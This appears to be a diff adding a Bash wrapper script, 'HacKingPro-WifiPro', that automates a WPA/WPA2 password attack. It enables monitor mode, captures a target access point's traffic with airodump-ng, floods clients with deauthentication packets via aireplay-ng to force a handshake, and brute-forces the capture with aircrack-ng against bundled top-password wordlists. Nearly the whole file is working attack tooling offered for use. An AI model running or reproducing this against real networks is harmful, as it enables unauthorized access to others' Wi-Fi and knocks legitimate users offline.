@@ -1,0 +1,377 @@
+#!/bin/sh
+#!/bin/bash
+#!/usr/bin/sh
+#!/usr/bin/bash
+#!/usr/bin/env sh
+#!/usr/bin/env bash
+#!/data/data/com.termux/files/usr/bin/sh
+#!/data/data/com.termux/files/usr/bin/bash
+###############################################################
+#                         WifiPro                             #
+#-Info--------------------------------------------------------#
+#                    HacKing Wifi Wireless                    #
+#-About-------------------------------------------------------#
+#--╼▰[ Skils ]-╼▰[ MultiMan ]                                 #
+#--╼▰[ Part of ]-╼▰[ HacKingPro ]                             #
+#--╼▰[ Script Name ]-╼▰[ HacKingPro-WifiPro ]                 #
+#--╼▰[ Author ]-╼▰[ AnLoMinus ]-╼▰[ Leon Yaakobov ]           #
+###############################################################
+# CREDIT: To All World Creators free Scripts & Tools          #
+# BIG THANX TO ALL COMUNITY THAT SHARE ALL THAT FREE          #
+# GREAT SCRIPTS                                               #
+# Location: Made With LOVE IN ISRAEL !                        #
+###############################################################
+#-Metadata----------------------------------------------------#
+#--╼▰[ Version ]-╼▰[ 1.0.0 ]                                  #
+#--╼▰[ Source ]-╼▰[ https://github.com/AnLoMinus/HacKingPro ] #
+#--╼▰[ Created ]-╼▰[ 09-10-2022 ]                             #
+#--╼▰[ Update ]-╼▰[ 09-10-2022 ]                              #
+###############################################################
+# h4rpy
+#--╼▰[ Main Menu ]--╼▰ [ WifiPro ]
+
+####### Table of contents
+
+#--╼▰[ Main Menu ]--╼▰ [ WifiPro ]--╼▰ [ Menu ]--╼▰ [ Starting ]
+red='\033[0;31m'
+green='\033[0;32m'
+yellow='\033[0;33m'
+default='\033[0;39m'
+WifiProMenu(){
+  # terminator -l HacKingPro-WifiPro
+  echo  "[${green}*${default}] Starting HacKingPro-WifiPro..."
+  bash HacKingPro-WifiPro
+  # echo "[${red}*${default}] HacKingPro-WifiPro Stopped."
+}
+
+#--╼▰[ Main Menu ]--╼▰ [ WifiPro ]--╼▰ [ Menu ]
+_1_config(){
+  echo '
+  [global_config]
+    suppress_multiple_term_dialog = True
+  [keybindings]
+  [profiles]
+    [[default]]
+      background_darkness = 0.8
+      background_type = transparent
+      cursor_color = "#aaaaaa"
+      use_system_font = False
+  [layouts]
+    [[default]]
+      [[[window0]]]
+        type = Window
+        parent = ""
+      [[[child1]]]
+        type = Terminal
+        parent = window0
+        command = ""
+    [[HacKingPro-WifiPro]]
+      [[[child0]]]
+        type = Window
+        parent = ""
+        order = 0
+        position = 0:27
+        maximised = True
+        fullscreen = False
+        size = 1366, 704
+        title = HacKingPro-WifiPro
+        last_active_term = bfc5b2cd-787a-4e04-85af-d0613a5fdda4
+        last_active_window = True
+      [[[child1]]]
+        type = HPaned
+        parent = child0
+        order = 0
+        position = 680
+        ratio = 0.4996326230712711
+      [[[child2]]]
+        type = VPaned
+        parent = child1
+        order = 0
+        position = 350
+        ratio = 0.5007153075822603
+      [[[terminal3]]]
+        type = Terminal
+        parent = child2
+        order = 0
+        profile = default
+        uuid = bfc5b2cd-787a-4e04-85af-d0613a5fdda4
+        command = bash mm_ad.sh
+      [[[terminal4]]]
+        type = Terminal
+        parent = child2
+        order = 1
+        profile = default
+        uuid = 3646254b-0ebc-4bbd-ab97-fee8f0792b06
+        command = bash ar.sh
+      [[[child5]]]
+        type = VPaned
+        parent = child1
+        order = 1
+        position = 350
+        ratio = 0.5007153075822603
+      [[[terminal6]]]
+        type = Terminal
+        parent = child5
+        order = 0
+        uuid = 3dfcf78d-f687-4d72-b156-b71d447c3d74
+        command = bash ad.sh
+      [[[terminal7]]]
+        type = Terminal
+        parent = child5
+        order = 1
+        profile = default
+        uuid = a2856dda-d422-4c8a-9cb4-b8eb8e455388
+        command = bash ac.sh
+  [plugins]' > WifiProX/config
+}
+#--╼▰[ Main Menu ]--╼▰ [ WifiPro ]--╼▰ [ Menu ]
+_2_config_sh(){
+  rm WifiProX/Output/sample.txt
+  if [ -x "$(command -v pacman)" ]; then
+  	pacman -Sy aircrack-ng terminator net-tools
+  elif [ -x "$(command -v apt)" ]; then
+  	apt install aircrack-ng terminator net-tools
+  fi
+  mkdir /root/.config
+  mkdir /root/.config/terminator
+  cp WifiProX/config /root/.config/terminator/config
+
+}
+#--╼▰[ Main Menu ]--╼▰ [ WifiPro ]--╼▰ [ Menu ]
+_3_mm_ad_sh(){
+  splash() {
+  	clear
+  	echo "${red}.__        _____"
+  	echo '|  |__    /  |  |_____________ ___.__.'
+  	echo '|  |  \  /   |  |\_  __ \____ <   |  |'
+  	echo '|   Y  \/    ^   /|  | \/  |_> >___  |'
+  	echo '|___|  /\____   | |__|  |   __// ____|'
+  	echo '     \/      |__|       |__|   \/'
+          echo "${red}    Simple WPA/WPA2 PSK attack tool${default}"
+  	echo "${default}                     by: n1x_ ${red}[${default}MS-WEB${red}]${default}\n"
+  	sleep 2
+  }
+
+  select_interface() {
+  	echo "[${yellow}*${default}] Available network interfaces: \n"
+  	iwconfig
+  	echo "\n[${green}+${default}] Enter network interface: "
+  	read interface
+  }
+
+  monitor_mode() {
+  	echo "[${yellow}*${default}] Eliminating processes that might interfere with the aircrack-ng suite..."
+  	if airmon-ng check kill; then
+  		echo "[${green}*${default}] Operation completed successfully."
+  	else
+  		echo "[${red}!${default}] Operation failed!"
+  		exit 1
+  	fi
+  	echo "[${yellow}*${default}] Trying to enable monitor mode on selected wireless network interface..."
+  	ifconfig $interface down
+  	if iwconfig $interface mode monitor; then
+  		echo "[${green}*${default}] Monitor mode enabled on selected wireless network interface."
+  	else
+  		echo "[${red}!${default}] Operation failed!"
+  		exit 1
+  	fi
+  	ifconfig $interface up
+  }
+
+  save_interface() {
+  	echo $interface > .interface.txt
+  }
+
+  airodump() {
+  	echo "[${yellow}*${default}] Scanning the wireless space for networks. Use Ctrl+C to stop the operation when the target is acquired."
+  	echo "[${green}+${default}] Press Enter to continue."
+  	read
+  	airodump-ng $interface
+  	echo "\n[${red}*${default}] Operation stopped. Press any key to restart."
+  	read
+  	airodump1
+  }
+
+  airodump1() {
+          airodump-ng $interface
+          echo "[${red}*${default}] Operation stopped. Press Enter to restart."
+  	read
+  	airodump1
+  }
+
+  	red='\033[0;31m'
+  	green='\033[0;32m'
+  	yellow='\033[0;33m'
+  	default='\033[0;39m'
+
+  splash
+  select_interface
+  monitor_mode
+  save_interface
+  airodump
+
+}
+#--╼▰[ Main Menu ]--╼▰ [ WifiPro ]--╼▰ [ Menu ]
+_4_ad_sh(){
+  #!/bin/bash
+
+  read_interface() {
+  	interface=$(cat .interface.txt)
+  }
+
+  output_dir_check() {
+  	if [ -d "Output/$output" ]
+  		then
+  			echo "[${red}!${default}] Directory already exists!"
+  			echo "[${green}+${default}] Enter the name for output and the output directory: "
+  			read output
+  			output_dir_check
+  	fi
+  }
+
+  airodump() {
+  	clear
+  	echo "[${green}+${default}] Enter the MAC address of access point (BSSID): "
+  	read bssid
+  	echo $bssid > .current_target.txt
+  	echo "[${green}+${default}] Enter the access point channel: "
+  	read channel
+  	echo "[${green}+${default}] Enter the name for output and the output directory: "
+  	read output
+  	output_dir_check
+  	mkdir WifiProX/Output/$output
+  	echo $output > .output.txt
+  	cd WifiProX/Output/$output
+  	echo "[${green}+${default}] Capturing packets on $bssid. Use Ctrl+C to stop the operation."
+  	echo "[${green}+${default}] Press Enter to continue."
+  	read
+  	airodump-ng --bssid $bssid -c $channel -w $output $interface
+  	echo -n "\n[${red}*${default}] Operation stopped. Press Enter to restart."
+  	read
+  	cd ../../../
+  	airodump
+  }
+
+          red='\033[0;31m'
+          green='\033[0;32m'
+          yellow='\033[0;33m'
+          default='\033[0;39m'
+
+  read_interface
+  airodump
+
+}
+#--╼▰[ Main Menu ]--╼▰ [ WifiPro ]--╼▰ [ Menu ]
+_5_ar_sh(){
+  read_parameters() {
+  	interface=$(cat .interface.txt)
+  	bssid=$(cat .current_target.txt)
+  }
+
+  aireplay() {
+  	clear
+  	echo "[${green}+${default}] Press Enter to start deauthentication attack."
+  	read
+  	echo "[${green}+${default}] Enter the MAC address of wireless client (optional, press enter for broadcast deauthentication): "
+  	read client
+  	echo "[${green}+${default}] Enter the number of number of groups of deauthentication packets to send out: "
+  	read packets
+  	echo "[${green}+${default}] Press Enter to start the operation."
+  	read
+  	if [ -z "$client" ]
+  		then
+  			aireplay-ng -0 $packets -a $bssid $interface
+  			restart
+  		else
+  			aireplay-ng -0 $packets -c $client -a $bssid $interface
+  			unset client
+  			restart
+  	fi
+  }
+
+  restart() {
+  	echo -n "\n[${green}*${default}] Operation completed. Press Enter to restart."
+  	read
+  	aireplay
+  }
+
+  	red='\033[0;31m'
+  	green='\033[0;32m'
+  	yellow='\033[0;33m'
+  	default='\033[0;39m'
+
+  read_parameters
+  aireplay
+  restart
+
+}
+#--╼▰[ Main Menu ]--╼▰ [ WifiPro ]--╼▰ [ Menu ]
+_6_ac_sh(){
+  #!/bin/bash
+
+  read_parameters() {
+  	bssid=$(cat .current_target.txt)
+  	output=$(cat .output.txt)
+  }
+
+  wordlists() {
+  	clear
+  	echo "[${yellow}*${default}] Available wordlists: \n
+  	[${yellow}0${default}] Custom.\n
+  	[${yellow}1${default}] WPA-Top62.
+  	[${yellow}2${default}] WPA-Top447.
+  	[${yellow}3${default}] WPA-Top4800.
+  	\n[${green}+${default}] Enter a wordlist to use in brute-forcing: "
+  	read wordlist_choice
+  	case "$wordlist_choice" in
+  		0)
+  			echo "[${green}+${default}] Enter the path to wordlist: "
+  			read wordlist
+  			;;
+  		1)
+  			wordlist=WifiProX/Wordlists/WPA-Top62.txt
+  			;;
+  		2)
+  			wordlist=WifiProX/Wordlists/WPA-Top447.txt
+  			;;
+  		3)
+  			wordlist=WifiProX/Wordlists/WPA-Top4800.txt
+  			;;
+  	esac
+  }
+
+  aircrack() {
+  	echo "[${green}+${default}] Press Enter to start brute-forcing (when handshake is captured)."
+  	read
+  	cap_file="$output-01.cap"
+  	aircrack-ng -b $bssid -w $wordlist WifiProX/Output/$output/$cap_file
+  	restart
+  }
+
+  restart() {
+          echo -n "\n[${green}*${default}] Operation completed. Press Enter to restart."
+          read
+  	clear
+          aircrack
+  }
+
+          red='\033[0;31m'
+          green='\033[0;32m'
+          yellow='\033[0;33m'
+          default='\033[0;39m'
+
+  read_parameters
+  wordlists
+  aircrack
+
+}
+
+
+#####
+# _1_config
+# _2_config_sh
+_3_mm_ad_sh
+read " Some Read"
+_4_ad_sh
+# _5_ar_sh
+# _6_ac_sh
